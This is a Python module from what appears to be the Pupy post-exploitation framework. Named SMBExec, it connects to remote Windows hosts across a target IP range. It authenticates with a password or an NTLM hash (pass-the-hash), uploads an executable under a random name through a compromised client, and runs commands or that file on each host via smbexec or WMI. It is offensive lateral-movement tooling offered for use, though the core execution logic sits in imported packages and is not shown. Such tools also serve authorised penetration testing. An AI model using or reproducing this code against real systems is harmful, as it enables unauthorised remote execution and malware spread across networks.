# -*- coding: UTF8 -*-
# Author: byt3bl33d3r and Shawn Evans
# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r 
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
import pupygen
import re
import os
import tempfile
import random
import string
from rpyc.utils.classic import upload

__class_name__="SMBExec"

@config(cat="admin")
class SMBExec(PupyModule):
    """ Launch remote commands using smbexec or wmiexec"""

    def init_argparse(self):
        
        self.arg_parser = PupyArgumentParser(prog="smbexec", description=self.__doc__)
        self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
        self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
        self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
        self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
        self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
        self.arg_parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
        self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")

        sgroup = self.arg_parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
        sgroup.add_argument("-F", dest="file", default=None, help="Upload and execute an exe file")
        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
        sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command")
        
    def run(self, args):

        if "/" in args.target[0]:
            hosts = IPNetwork(args.target[0])
        else:
            hosts = list()
            hosts.append(args.target[0])
        
        src = ''
        dst = ''
        exe_name = ''
        if args.file:
            if not os.path.exists(args.file):
                self.error('File not found: %s' % args.file)
                return

            if not args.file.endswith('.exe'):
                self.error('Only executable files could be uploaded')
                return

            exe_name = ''.join(random.sample(string.ascii_letters, 10)) + '.exe'
            if self.client.is_windows():
                remote_path = '%s\\%s' % (self.client.conn.modules['os.path'].expandvars("%ALLUSERSPROFILE%"), exe_name) # Do a remote path for linux machine
            else:
                remote_path = '/tmp/%s' % exe_name

            self.info("Uploading file to {0}".format(remote_path))
            upload(self.client.conn, args.file, remote_path)
            self.info("File uploaded")
            
            # once uploaded, this file has to be uploaded to the windows share
            src = remote_path
            dst = '%s\\%s' % (args.share.replace('$', ':'), exe_name)

        self.info("Loading dependencies")
        self.client.load_package("impacket")
        self.client.load_package("calendar")
        self.client.load_package("pupyutils.smbexec")

        with redirected_stdo(self.client.conn):
            for host in hosts:
                self.info("Connecting to the remote host: %s" % host)
                self.client.conn.modules["pupyutils.smbexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, args.file, exe_name, src, dst, args.command, args.domain, args.execm)
    